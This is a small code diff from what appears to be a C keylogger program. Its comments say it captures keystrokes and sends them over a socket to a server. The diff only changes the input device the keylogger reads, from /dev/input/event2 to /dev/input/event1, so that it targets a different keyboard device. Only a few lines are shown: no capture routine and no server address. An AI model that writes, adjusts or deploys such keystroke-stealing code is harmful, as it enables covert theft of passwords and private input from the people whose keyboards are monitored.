@@ -30,7 +30,7 @@ int main() {
     printf("Connected\n");
 
     // Start the keylogger and send keystrokes to server
-    start_keylogger(sock, "/dev/input/event2");  // Pass the socket and device path
+    start_keylogger(sock, "/dev/input/event1");  // Pass the socket and device path
 
     // Close the socket
     close(sock);
